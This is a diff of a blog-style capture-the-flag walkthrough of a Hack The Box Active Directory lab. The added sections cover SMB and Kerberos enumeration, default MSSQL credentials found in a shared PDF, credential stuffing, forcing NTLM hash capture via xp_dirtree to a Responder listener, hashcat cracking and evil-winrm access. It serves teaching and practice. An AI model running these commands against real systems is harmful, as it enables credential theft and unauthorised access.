@@ -324,8 +324,8 @@
                     <div class="date" title="Date">
                         <i class="bi bi-calendar3"></i>
                         <time
-                            datetime="2024.04.10"
-                            >2024.04.10
+                            datetime="2024.05.10"
+                            >2024.05.10
                         </time>
                     </div>
                 
@@ -335,7 +335,7 @@
                         class="readtime"
                         title="Time to Read">
                         <i class="bi bi-clock"></i>
-                        8 mins to read
+                        24 mins to read
                     </div>
                 
             </div>
@@ -378,6 +378,30 @@
                             href="/tags/ldap/"
                             class="tag-btn">
                             LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/mssql/"
+                            class="tag-btn">
+                            MSSQL
+                        </a>
+                    
+                        <a
+                            href="/tags/mysql/"
+                            class="tag-btn">
+                            MYSQL
+                        </a>
+                    
+                        <a
+                            href="/tags/ca/"
+                            class="tag-btn">
+                            CA
+                        </a>
+                    
+                        <a
+                            href="/tags/certificate/"
+                            class="tag-btn">
+                            CERTIFICATE
                         </a>
                     
                 </div>
@@ -437,14 +461,36 @@
         <li><a href="#dns-53">DNS <code>53</code>:</a></li>
         <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
         <li><a href="#smb-445">SMB <code>445</code>:</a></li>
-        <li><a href="#rpc-135-and-593-rpc-over-http">RPC <code>135</code> &amp; <code>593</code> RPC Over HTTP:</a></li>
         <li><a href="#mssql-1433">MSSQL <code>1433</code>:</a></li>
       </ul>
     </li>
-    <li><a href="#2-dot-foothold">2. Foothold:</a></li>
-    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a></li>
-    <li><a href="#4-dot-ownership">4. Ownership:</a></li>
-    <li><a href="#5-dot-persistence">5. Persistence:</a></li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#connecting-to-the-mssql-instance-using-impacket-mssqlclient">Connecting to the MSSQL Instance using impacket-mssqlclient:</a></li>
+        <li><a href="#enumerating-the-mssql-instance">Enumerating the MSSQL Instance:</a></li>
+        <li><a href="#capturing-the-mssql-system-admin-hash-using-responder-and-xp-dirtree">Capturing the MSSQL System Admin hash using <a href="https://www.kali.org/tools/responder/">Responder</a> &amp; <code>xp_dirtree</code>:</a></li>
+        <li><a href="#cracking-the-mssql-system-admin-using-hashcat">Cracking the MSSQL System Admin using <a href="https://www.kali.org/tools/hashcat/">Hashcat</a>:</a></li>
+        <li><a href="#enumerating-smb-as-sql-svc-user">Enumerating SMB as <code>sql_svc</code> user:</a></li>
+        <li><a href="#running-bloodhound-dot-py">Running bloodhound.py:</a></li>
+        <li><a href="#connecting-to-the-mssql-as-sql-svc">Connecting to the MSSQL as <code>sql_svc</code>:</a></li>
+        <li><a href="#finding-a-linked-sql-instance">Finding a linked SQL Instance:</a></li>
+        <li><a href="#enumerating-the-host-using-xp-dirtree">Enumerating the Host Using <code>xp_dirtree</code>:</a></li>
+        <li><a href="#downloading-errorlog-dot-bak-and-why-it-s-important-to-re-check-your-tools">Downloading <code>ERRORLOG.BAK</code> &amp; why it&rsquo;s important to re-check your tools:</a></li>
+        <li><a href="#reading-errorlog-dot-bak-and-finding-credentials-for-ryan-dot-cooper">Reading <code>ERRORLOG.BAK</code> &amp; finding credentials for <code>Ryan.Cooper</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#enumerating-the-host-as-ryan-dot-cooper">Enumerating the host as <code>Ryan.Cooper</code>:</a></li>
+        <li><a href="#using-esc1-attack-chain-to-elevate-privileges-to-administrator">Using ESC1 Attack Chain to elevate privileges to Administrator:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-ownership">4. Ownership:</a>
+      <ul>
+        <li><a href="#dumping-ntds-dot-dit-database">Dumping <code>NTDS.dit</code> database:</a></li>
+        <li><a href="#loading-dot-ccache-into-the-krb5ccname-variable-to-authenticate">Loading <code>.ccache</code> into the <code>KRB5CCNAME</code> Variable to Authenticate:</a></li>
+      </ul>
+    </li>
     <li><a href="#lessons-learned">Lessons Learned:</a>
       <ul>
         <li><a href="#what-did-i-learn">What did I learn?</a></li>
@@ -452,12 +498,6 @@
       </ul>
     </li>
     <li><a href="#sign-off">Sign off:</a></li>
-    <li><a href="#9c69d6"><del>CREDS</del>:</a>
-      <ul>
-        <li><a href="#ssh-keys">SSH Keys:</a></li>
-        <li><a href="#compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</a></li>
-      </ul>
-    </li>
   </ul>
 </nav>
         
@@ -472,12 +512,6 @@
 <h2 id="1-dot-enumeration">1. Enumeration:</h2>
 <h3 id="nmap">NMAP:</h3>
 <ul>
-<li>
-<p>+Testing+:</p>
-</li>
-<li>
-<p>=Example=:</p>
-</li>
 <li>
 <p><strong>Basic Scan</strong>:</p>
 <ul>
@@ -915,13 +949,14 @@
 <h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
 <h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
 <ul>
-<li>
-<p>As kerberos is present we can enumerate users using <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:</p>
+<li>As kerberos is present we can enumerate users using <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
 <ul>
 <li><code>kerbrute userenum -d sequel.htb --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-084056_.png">
+</figure>
+</li>
+<li>Unfortunately we get no hits:</li>
 </ul>
-<p><img src="/ox-hugo/2024-10-04-084056_.png" alt="">
-Unfortunately we get no hits:</p>
 </li>
 </ul>
 <h3 id="smb-445">SMB <code>445</code>:</h3>
@@ -930,22 +965,20 @@ Unfortunately we get no hits:</p>
 <li>
 <p><strong>I check for a null sesion using netexec but they have been disabled</strong>:</p>
 <ul>
-<li>
-<p><code>netexec smb $box -u '' -p '' --shares</code></p>
-<figure><img src="/ox-hugo/2024-10-04-084303_.png">
-        </figure>
-
+<li><code>netexec smb $box -u '' -p '' --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-084303_.png">
+</figure>
 </li>
 </ul>
 </li>
 <li>
 <p><strong>I check if the guest account has been disabled</strong>:</p>
 <ul>
-<li>
-<p><code>netexec smb $box -u 'guest' -p '' --shares</code>
-<img src="/ox-hugo/2024-10-04-084640_.png" alt=""></p>
-<p>It looks like we can access the <code>Public</code> &amp; <code>IPC$</code> We will focus on the <code>Public</code> share.</p>
+<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-084640_.png">
+</figure>
 </li>
+<li>It looks like we can access the <code>Public</code> &amp; <code>IPC$</code> We will focus on the <code>Public</code> share.</li>
 </ul>
 </li>
 </ul>
@@ -969,122 +1002,1130 @@ Unfortunately we get no hits:</p>
 </ul>
 </li>
 </ul>
-<h3 id="rpc-135-and-593-rpc-over-http">RPC <code>135</code> &amp; <code>593</code> RPC Over HTTP:</h3>
+<h4 id="connecting-to-the-public-smb-share-using-smbclient">Connecting to the Public <code>SMB</code> Share using <code>smbclient</code>:</h4>
+<ul>
+<li>
+<p><strong>I logon to the share using a guest session</strong>:</p>
+<ul>
+<li><code>smbclient -U 'guest'  &quot;\\\\$box\\Public&quot;</code>
+<ul>
+<li>I see they have a <code>.pdf</code> called <code>SQL Server Procedures</code> in the share
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-090146_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I download the</strong> <code>.pdf</code>:</p>
+<ul>
+<li><code>Get &quot;SQL Server Procedures.pdf&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-090343_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</h4>
+<p>If you are not aware, it is sometimes possible to extract valid domain usersnames from <code>pdf's</code> if they have been created on a Windows host. As often the Creator Field is populated using the Windows User&rsquo;s Logged-In Name</p>
+<ul>
+<li><strong>Some reasons why the Creator Field Uses the Windows User&rsquo;s Logged-In Name</strong>:
+<ul>
+<li>
+<p><strong>PDF Metadata Collection</strong>:</p>
+<ul>
+<li>When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.</li>
+</ul>
+</li>
+<li>
+<p><strong>System Environment Variables</strong>:</p>
+<ul>
+<li>The logged-in Windows username is part of system environment variables. This is often used to populate fields like &ldquo;<code>Creator</code>&rdquo; in the PDF document.</li>
+</ul>
+</li>
+<li>
+<p><strong>Program Defaults</strong>:</p>
+<ul>
+<li>By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.</li>
+</ul>
+</li>
+<li>
+<p><strong>Tracking Ownership</strong>:</p>
+<ul>
+<li>This feature helps track the original creator or author of a document for auditing or document management purposes.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="attempting-to-extract-usernames-from-the-pdf-using-exiftool">Attempting to extract Usernames From the PDF using exiftool:</h5>
+<ul>
+<li><code>exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq &gt; userNames.txt</code></li>
+<li>I run it and check the output of the file, however there are no valid usernames, just that it was crated using Mozilla.</li>
+<li><figure><img src="/ox-hugo/2024-10-04-091217_.png">
+</figure>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Command Breakdown:</p>
+<ol>
+<li>
+<p><code>exiftool -Creator -csv *pdf</code></p>
+<ul>
+<li><code>exiftool</code>: Run the tool</li>
+<li><code>-Creator</code>: Extracts the <code>Creator</code> metadata field from the files.</li>
+<li><code>-csv</code>: Outputs the data in CSV format.
+<ul>
+<li>This is the most important part for the rest of the command to work:
+<ul>
+<li>The <code>CSV</code> format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF&rsquo;s metadata is presented as a row, and each field (like &ldquo;<code>Creator</code>&rdquo;) is a column. This makes it easier to process the data programmatically.</li>
+<li><strong>Simplicity</strong>: When using tools like <code>cut</code>, it’s easier to extract specific fields by referring to column numbers (e.g., <code>-f2</code> for the second column), which is straightforward with <code>CSV</code> formatting.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>*pdf</code>: Targets all PDF files in the current directory.</li>
+</ul>
+</li>
+<li>
+<p><code>| cut -d, -f2</code></p>
+<ul>
+<li><code>|</code>: Pipes the output from the previous command into the next.</li>
+<li><code>cut</code>: Extracts specific fields from the CSV output.</li>
+<li><code>-d,</code>: Uses a comma as the delimiter (since it&rsquo;s CSV data).</li>
+<li><code>-f2</code>: Selects the second field, which contains the creator name.</li>
+</ul>
+</li>
+<li>
+<p><code>| sort</code>: Sorts the creator names alphabetically.</p>
+</li>
+<li>
+<p><code>| uniq</code>: Removes duplicate names, leaving only unique entries.</p>
+</li>
+<li>
+<p><code>&gt; userNames.txt</code></p>
+<ul>
+<li>Redirects the final output (unique creator names) into a file named <code>userNames.txt</code></li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h4 id="finding-hard-coded-mssql-creds-in-the-sql-server-procedures-pdf">Finding Hard-Coded mSSQL Creds in the <code>SQL Server Procedures</code> PDF:</h4>
+<ul>
+<li>
+<p><strong>Problematic MSSQL Instance</strong>:</p>
+<ul>
+<li>Reading the PDF it details how the company has had issues with mistakes with the MSSQL instance. However it appears there is still a live server running on the DC (which we have seen from our <code>NMAP</code> scan)
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-091649_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Hard Coded Creds</strong>:</p>
+<ul>
+<li>Looking on the second page we can see they hard creds for new hires and have placed these in the <code>.pdf</code> naughty, naughty!</li>
+<li><figure><img src="/ox-hugo/2024-10-04-091505_.png">
+</figure>
+</li>
+<li>We will use these to connect</li>
+</ul>
+</li>
+</ul>
+<h4 id="finding-usernames-within-the-pdf">Finding Usernames within the PDF:</h4>
+<ul>
+<li><strong>Finding Usernames</strong>:
+<ul>
+<li>Looking through the file we can see that the users, <code>Ryan</code>, <code>Tom</code> &amp; <code>Brandon</code>.
+There is also a mail to hyperlink to Brandon that reveals his username to be <code>Brandon.brown@sequel.htb</code> I will add these to my username list.</li>
+</ul>
+</li>
+</ul>
+<h4 id="cred-stuffing-and-meaning-of-guest-in-the-smb-responses-in-netexec">Cred Stuffing &amp; Meaning of &ldquo;<code>Guest</code>&rdquo; in the <code>SMB</code> Responses in <code>netexec</code>:</h4>
+<ul>
+<li>I tried cred stuffing all of the users &amp; the password I have found so far and got the below output, where <code>(Guest)</code> was appended to each attempt.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-092745_.png">
+</figure>
+</li>
+<li>I had never seen this before &amp; it led me to this page:
+<ul>
+<li>
+<p><a href="https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon">https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon</a></p>
+</li>
+<li>
+<p>Which says this:</p>
+<blockquote>
+<p>Using a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you&rsquo;re targetting is enabled.</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Guest account in</strong> <code>SMB</code>:
+<ul>
+<li><code>SMB</code> servers often allow users to connect as a <code>Guest</code>, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files.</li>
+<li>In this case <code>sequel.htb\ryan:GuestUserCantWrite1 (Guest)</code> indicates that the <code>ryan</code> account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources.</li>
+<li>So when you see &ldquo;<code>Guest</code>&rdquo; listed after users like <code>sequel.htb\ryan</code>, <code>sequel.htb\tom</code>, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB.</li>
+</ul>
+</li>
+</ul>
 <h3 id="mssql-1433">MSSQL <code>1433</code>:</h3>
+<ul>
+<li>I store each useful bit of information in <code>VARS</code> so I can easily call on them later and have to type way less:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-093531_.png">
+</figure>
+</li>
+<li>This is also a great way to ensure you make less mistakes &amp; type-os.</li>
+</ul>
+</li>
+</ul>
+<h4 id="cred-stuffing-the-mssql-instance">Cred stuffing the MSSQL Instance:</h4>
+<ul>
+<li>I cred stuff with all the known users so far just incase they have not changed their password from the default password, however it appears they have.</li>
+<li><figure><img src="/ox-hugo/2024-10-04-111518_.png">
+</figure>
+</li>
+</ul>
 <h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="connecting-to-the-mssql-instance-using-impacket-mssqlclient">Connecting to the MSSQL Instance using impacket-mssqlclient:</h3>
+<ul>
+<li><strong>Connecting to the mssql instance</strong>:
+<ul>
+<li><code>impacket-mssqlclient $domain/$user:$pass@$box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-093702_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-mssql-instance">Enumerating the MSSQL Instance:</h3>
+<ul>
+<li>Looking through the mssql instance there are only default databases.</li>
+<li>I try and activate <code>xp_cmdshell</code> however we do not have perms:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-113407_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="capturing-the-mssql-system-admin-hash-using-responder-and-xp-dirtree">Capturing the MSSQL System Admin hash using <a href="https://www.kali.org/tools/responder/">Responder</a> &amp; <code>xp_dirtree</code>:</h3>
+<ul>
+<li>
+<p>I know that it&rsquo;s possible to read files using <code>xp_dirtree</code> as I did this on the Manager box:</p>
+<ul>
+<li><a href="https://bloodstiller.com/walkthroughs/manager-box/">https://bloodstiller.com/walkthroughs/manager-box/</a></li>
+</ul>
+</li>
+<li>
+<p><strong>I check if I can use <code>xp_dirtree</code> to read &amp; list local files</strong></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-114913_.png">
+</figure>
+</li>
+<li>I cannot read files however my password is <code>GuestUserCantWrite1</code> so lets see if we can write as I know it&rsquo;s possible to host a malicious SMB server and request the DB instance attempt to connect so we can capture the <code>MSSQL System Administrator Hash</code>
+<ul>
+<li>Just a note: impacket-mssqlclient.py has good tools built in already so you you can just run <code>xp_dirtee &lt;path&gt;</code> you do not have to use all args etc.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-125702_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
 <ol>
-<li></li>
+<li>
+<p><strong>I start</strong> <a href="https://www.kali.org/tools/responder/">Responder</a>:</p>
+<ul>
+<li><code>sudo responder -v -I tun0</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I use</strong> <code>xp_dirtee</code> <strong>to connect back to my malicious SMB server</strong>:</p>
+<ul>
+<li><code>exec master..xp_dirtree '\\10.10.14.38\share\'</code>
+<ul>
+<li>This is just \\&lt;MYKALIIP\FAKESHARE&gt;</li>
+<li><figure><img src="/ox-hugo/2024-10-04-115426_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Hash Caught</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-115545_.png">
+</figure>
+</li>
+<li>This works as when we run the command using <code>xp_dirtree</code> it tries to connect &amp; authorize to our malicious <code>SMB server</code> &amp; <a href="https://www.kali.org/tools/responder/">Responder</a> captures the hash:</li>
+</ul>
+</li>
 </ol>
+<h4 id="overview-of-xp-dirtree">Overview of <code>xp_dirtree</code>:</h4>
+<ul>
+<li>
+<p><code>xp_dirtree</code> is an extended stored procedure in Microsoft SQL Server.</p>
+</li>
+<li>
+<p>It is used to list the directory structure (files and subdirectories) of a specified path on the server.</p>
+</li>
+<li>
+<p>Command Injection Risk: Since it&rsquo;s interacting with the OS, it can be a target for malicious input if not properly handled. (E.G. Getting it to connect to our malicious SMB server so we can capture hashes)</p>
+</li>
+<li>
+<p><strong>Using</strong> <code>xp_dirtree</code>:</p>
+</li>
+<li>
+<p>Called using the syntax below:</p>
+<ul>
+<li><code>EXEC xp_dirtree 'path', depth, file_flag;</code></li>
+<li><strong>Example</strong>: <code>EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;</code></li>
+<li><strong>Example</strong>: <code>EXEC xp_dirtree 'C:\', 1, 1;</code>
+<ul>
+<li><strong>Notes</strong>:
+<ul>
+<li><strong>Path Specified</strong>:
+<ul>
+<li><code>C:\</code> Lists the contents of the root of the C drive.</li>
+</ul>
+</li>
+<li><strong>Depth Level</strong>:
+<ul>
+<li><code>1</code>: Indicates it will list files and directories in the first level of the C drive.</li>
+<li>This includes files directly in <code>C:\</code> and the first-level directories under <code>C:\</code>.</li>
+</ul>
+</li>
+<li><strong>File Flag</strong>:
+<ul>
+<li><code>1</code>: Specifies that both files and directories should be included in the output.</li>
+</ul>
+</li>
+<li><strong>Output</strong>:
+<ul>
+<li><!-- raw HTML omitted -->The result set will contain<!-- raw HTML omitted -->:
+<ul>
+<li>All files located directly in <code>C:\</code>.</li>
+<li>All first-level subdirectories (e.g., <code>C:\Program Files</code>, <code>C:\Windows</code>, etc.).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Note</strong>:
+<ul>
+<li>The command does <strong>not</strong> recursively list files in subdirectories beyond the first level due to the specified depth of 1~.</li>
+<li>If you want to see files in deeper levels, you can increase the depth parameter e.g. <code>2</code>, <code>3</code> etc</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="cracking-the-mssql-system-admin-using-hashcat">Cracking the MSSQL System Admin using <a href="https://www.kali.org/tools/hashcat/">Hashcat</a>:</h3>
+<ul>
+<li>
+<p><strong>I fire up</strong> <a href="https://www.kali.org/tools/hashcat/">hashcat</a> <strong>and good ol&rsquo; trusty rockyou</strong></p>
+<ul>
+<li><code>hashcat -m 5600 mssqlhash ~/Wordlists/rockyou.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-115952_.png">
+</figure>
+
+<ul>
+<li>Cracked!! In theory we should be able to authorize as this DBA, activate <code>xp_cmdshell</code> and get code execution on the underlying OS.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I verify it&rsquo;s valid</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-120456_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-smb-as-sql-svc-user">Enumerating SMB as <code>sql_svc</code> user:</h3>
+<ul>
+<li>
+<p>I check with netexec if the user can connect to SMB and they can, they have access to the <code>SYSVOL</code> share as well as the <code>NETLOGON</code> share.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-121444_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><code>SYSVOL</code> <strong>Share Enumeration</strong>:</p>
+<ul>
+<li>I use smbmap to enumerate the share but there is nothing of note:
+<ul>
+<li><code>smbmap -u $user -p $pass -H $box -r SYSVOl</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-122445_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>NETLOGON</code> <strong>Share Enumeration</strong>:</p>
+<ul>
+<li><code>smbmap -u $user -p $pass -H $box -r NETLOGON</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-122604_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="sysvol-share"><code>SYSVOL</code> Share:</h4>
+<ul>
+<li>Part of the <code>SYSVOL</code> directory is shared as the <code>SYSVOL</code> share; this is critical for distributing files necessary for Group Policy &amp; will often be used to hold scripts on a DC so this is a good target to go after.</li>
+</ul>
+<h3 id="running-bloodhound-dot-py">Running bloodhound.py:</h3>
+<ul>
+<li><strong>I use</strong> <code>bloodhound.py</code> <strong>to enumerate the domain with the creds I have</strong>.
+<ul>
+<li><code>python3 bloodhound.py -dc dc.sequel.htb -c All -u $user -p $pass -d sequel.htb -ns $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-122851_.png">
+</figure>
+</li>
+<li>Looking at the results our current user does not have that many privielges so I will continue to enumerate.</li>
+</ul>
+</li>
+</ul>
+<h3 id="connecting-to-the-mssql-as-sql-svc">Connecting to the MSSQL as <code>sql_svc</code>:</h3>
+<ul>
+<li>
+<p><strong>I connect to the host as</strong> <code>sql_svx</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-120929_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try and enable</strong> <code>xp_cmdshell</code> <strong>but am unable to</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-121124_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-a-linked-sql-instance">Finding a linked SQL Instance:</h3>
+<ul>
+<li>
+<p><del>Correction</del>: This is wrong, I later found it was just showing me my existing database, I have left it in as I believe it&rsquo;s important and show these mistakes.</p>
+</li>
+<li>
+<p><strong>I check if there are any linked remote SQL instances running</strong>:</p>
+<ul>
+<li><code>SELECT srvname, isremote FROM sysservers;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-172538_.png">
+</figure>
+</li>
+<li>We can also run the inbuilt command in <code>impacket-mssql</code>:</li>
+<li><code>enum_links</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-172800_.png">
+</figure>
+
+<ul>
+<li>I try and connect but I am unable to access the instance</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-host-using-xp-dirtree">Enumerating the Host Using <code>xp_dirtree</code>:</h3>
+<ul>
+<li>
+<p><strong>I check if am able to use</strong> <code>xp_dirtree</code> <strong>to list files on the host</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-125627_.png">
+</figure>
+</li>
+<li>Bingo</li>
+</ul>
+</li>
+<li>
+<p><strong>I list the users home folders and find a</strong> <code>Ryan.Cooper</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-125933_.png">
+</figure>
+</li>
+<li>I add his name to my users.</li>
+</ul>
+</li>
+<li>
+<p><strong>I try and list his home folder but don&rsquo;t have perms</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-130119_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I enumerate further and find that there is an</strong> <code>ERRORLOG.BAK</code> *file stored in <code>C:\SQLServer\Logs\</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-201906_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="downloading-errorlog-dot-bak-and-why-it-s-important-to-re-check-your-tools">Downloading <code>ERRORLOG.BAK</code> &amp; why it&rsquo;s important to re-check your tools:</h3>
+<ul>
+<li>
+<p><strong>I try and use the</strong> <code>SINGLE_CLOB</code> <strong>approach to read the file but don&rsquo;t have the required permissions</strong>:</p>
+<ul>
+<li><code>SELECT * FROM OPENROWSET(BULK N'C:\SQLServer\Logs\ERRORLOG.BAK', SINGLE_CLOB) AS Contents</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-202033_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try and create a new MSSQL database so I can then import the <code>ERROLOG.BAK</code> into it</strong>:</p>
+<ul>
+<li><code>CREATE DATABASE hacker;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-202602_.png">
+</figure>
+</li>
+<li>Denied again.</li>
+</ul>
+</li>
+<li>
+<p><strong>Using evil-winrm to retrieve the</strong> <code>ERRORLOG.BAK</code> <strong>file</strong>:</p>
+<ul>
+<li>I try and connect with <code>evil-winrm</code> which I was convinced I did earlier &amp; couldn&rsquo;t but tried again anyway &amp; could connect!!!
+<ul>
+<li>Slap me with the idiot gun stick!!!</li>
+<li><figure><img src="/ox-hugo/2024-10-04-203935_.png">
+</figure>
+</li>
+<li><del>Note</del>: This is something I want to stress, it&rsquo;s really important to re-check tools in situations like this sometimes you get false positives &amp; false negatives.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="reading-errorlog-dot-bak-and-finding-credentials-for-ryan-dot-cooper">Reading <code>ERRORLOG.BAK</code> &amp; finding credentials for <code>Ryan.Cooper</code>:</h3>
+<ul>
+<li>
+<p><strong>I open the <code>ERRORLOG.BAK</code> in my text editor</strong>:</p>
+<ul>
+<li>I search for the string &ldquo;password&rdquo; &amp; get a hit containing <code>Ryan.Coopers</code> password:</li>
+<li><figure><img src="/ox-hugo/2024-10-04-204115_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I verify if the creds are still valid using</strong> <code>netexec</code>:</p>
+<ul>
+<li><code>netexec smb $box -u $user -p $pass --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-204628_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
 <h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="enumerating-the-host-as-ryan-dot-cooper">Enumerating the host as <code>Ryan.Cooper</code>:</h3>
+<ul>
+<li>
+<p>In this section I am going to show EVERYTHING I do, obviously blogs are cultivated and don&rsquo;t show every little thing, but I want to show all the tools I try to get root.</p>
+</li>
+<li>
+<p><strong>I connect via</strong> <code>evil-winrm</code> <strong>&amp; retrive the flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-204858_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="automated-enumeration">Automated Enumeration:</h4>
+<ul>
+<li>
+<p><strong>I check bloodhound</strong>:</p>
+<ul>
+<li>But there is no clear path here so we need to enumerate the host and the user further:</li>
+</ul>
+</li>
+<li>
+<p><strong>I try and run</strong> <code>secretsdump.py</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-205950_.png">
+</figure>
+</li>
+<li><del>Note</del>: This may seem weird to do now, however I have had success retriveing creds this way and moving laterally.</li>
+</ul>
+</li>
+<li>
+<p><strong>Running</strong> <code>LaZagne.exe</code>:</p>
+<ul>
+<li>We get nothing, will have to try harder…offsec is that you?
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-210426_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I run</strong> <code>SessionGopher.ps1</code> <strong>to check for any other sessions</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-210750_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I run</strong> <code>privesccheck.ps1</code>:</p>
+<ul>
+<li>I do see that LSA is not protected:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-04-211219_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="stored-credentials-enumeration">Stored Credentials Enumeration:</h4>
+<ul>
+<li><strong>Check for stored creds using</strong> <code>cmdkey</code>:
+<ul>
+<li><code>cmdkey /list</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-211842_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="user-enumeration">User Enumeration:</h4>
+<ul>
+<li><strong>I enumerate users</strong>:
+<ul>
+<li><code>net user</code></li>
+<li><figure><img src="/ox-hugo/2024-10-04-214453_.png">
+</figure>
+</li>
+<li><del>Note</del>: The reason my user enumeration is not more extensive is due to the fact that Groups, Users &amp; Hosts are enumerated via bloodhound. My main goal at the moment is to find out what is happening on this specific DC.</li>
+</ul>
+</li>
+</ul>
+<h4 id="basic-system-enumeration">Basic System Enumeration:</h4>
+<ul>
